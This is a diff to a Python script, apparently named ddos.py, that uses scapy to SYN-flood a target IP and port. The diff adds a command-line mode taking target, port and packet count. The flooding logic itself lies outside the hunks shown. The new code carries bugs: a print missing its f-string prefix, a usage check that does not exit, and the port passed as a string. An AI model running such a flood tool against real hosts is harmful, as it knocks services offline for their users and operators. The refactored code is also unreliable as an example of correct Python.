@@ -1,5 +1,5 @@
 from os import system
-from sys import stdout
+import sys
 from scapy.all import *
 from random import randint
 import time
@@ -56,8 +56,8 @@ def SYN_Flood(dstIP, dstPort, counter):
     avg_time = avg_time/total
     with open('syns_results_p.txt', 'a') as f:
         f.write(f'\nTotal time - {attack_time}')
-        f.write(f'\nAverage time -{avg_time}')
-    stdout.write("\nTotal packets sent: %i\n" % total)
+        f.write(f'\nAverage time - {avg_time}')
+    print("\nTotal packets sent: {total}\n")
 
 
 def info():
@@ -73,11 +73,15 @@ def info():
 
     return dstIP, int(dstPort)
 
-
-def main():
+def interactive_mode():
     dstIP, dstPort = info()
     counter = input("How many packets do you want to send : ")
     SYN_Flood(dstIP, dstPort, int(counter))
+
+def main():
+    if len(sys.argv) != 4:
+        print("Usage: python3.8 ddos.py <IP> <Port> <Amount of Packets>\n")
+    SYN_Flood(sys.argv[1], sys.argv[2], int(sys.argv[3]))
 
 
 main()
